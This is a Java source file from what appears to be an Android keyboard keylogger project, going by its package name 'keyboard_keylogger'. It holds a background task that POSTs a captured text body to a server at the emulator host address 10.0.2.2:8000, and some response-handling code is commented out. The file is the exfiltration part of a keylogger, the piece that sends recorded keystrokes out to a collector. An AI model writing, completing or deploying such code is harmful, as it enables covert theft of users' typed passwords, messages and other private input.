package com.example.keyboard_keylogger;

import android.os.AsyncTask;


import java.io.BufferedOutputStream;

import java.io.BufferedWriter;
import java.io.IOException;

import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.nio.charset.StandardCharsets;

class HTTPReqTask extends AsyncTask<Void, Void, Void> {

    private String body;



    public HTTPReqTask setBody(String b){
        this.body=b;
        return this;
    }
    @Override
    protected Void doInBackground(Void... params) {
        HttpURLConnection urlConnection = null;

       // try {
        URL url = null;
        try {
            url = new URL("http://10.0.2.2:8000");
            urlConnection = (HttpURLConnection) url.openConnection();
            urlConnection.setRequestMethod("POST");
            urlConnection.setDoOutput(true);
            urlConnection.setDoInput(true);
            urlConnection.setChunkedStreamingMode(0);

            OutputStream out = new BufferedOutputStream(urlConnection.getOutputStream());
            BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(
                    out, StandardCharsets.UTF_8));
            writer.write(body);
            writer.flush();

            urlConnection.disconnect();
        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }


//            int code = urlConnection.getResponseCode();
//            if (code !=  200) {
//                throw new IOException("Invalid response from server: " + code);
//            }
//
//            BufferedReader rd = new BufferedReader(new InputStreamReader(
//                    urlConnection.getInputStream()));
//            String line;
//            while ((line = rd.readLine()) != null) {
//                Log.i("data", line);
//            }
//        } catch (Exception e) {
//            e.printStackTrace();
//        } finally {
//            if (urlConnection != null) {
//                urlConnection.disconnect();
//            }
//        }

        return null;
    }
}
